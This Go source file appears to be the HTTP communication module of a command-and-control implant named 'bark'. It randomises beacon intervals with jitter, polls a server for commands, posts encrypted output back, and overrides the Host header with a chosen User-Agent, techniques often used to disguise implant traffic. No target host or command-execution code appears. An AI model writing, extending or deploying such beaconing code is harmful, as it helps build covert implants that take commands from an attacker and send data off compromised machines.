package bark

import (
	"bytes"
	"io"
	"math/rand"
	"time"

	"log"
	"net/http"
)

func Jitter(d time.Duration, j float64) time.Duration {
	if j < 0.0 {
		return d
	}

	r := rand.Float64() * float64(d)
	if j > 0.0 && j < 1.0 {
		r = float64(j)*r + float64(1.0-j)*float64(d)
	}

	return time.Duration(r)
}

// Beacon out for cmd
func (httpconf *BarkConfig) beaconOut(url string) ([]byte, error) {

	//Create new request
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	if httpconf.Hh != "" {
		request.Host = httpconf.Hh
		
	}
	request.Header.Set("User-Agent", httpconf.Ua)

	//init client and send request.
	client := &http.Client{Transport: httpconf.tr}
	var resp *http.Response
	resp, err = client.Do(request)
	if err != nil {

		return nil, err
	}
	defer resp.Body.Close()

	request.Close = true

	if resp.StatusCode != 200 {

		return nil, nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {

		return nil, nil
	}

	return body, nil
}

// Post Data back to server
func (httpconf *BarkConfig) postOutput(url string, encbytes []byte) ([]byte, error) {

	//build the post request
	request, err := http.NewRequest("POST", url, bytes.NewReader(encbytes))
	if err != nil {
		log.Println(err)
	}
	if httpconf.Hh != "" {
		request.Host = httpconf.Hh

	}
	request.Header.Set("User-Agent", httpconf.Ua)
	var resp *http.Response

	client := &http.Client{Transport: httpconf.tr}
	resp, err = client.Do(request)
	if err != nil {
		return nil, err
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return body, nil

}
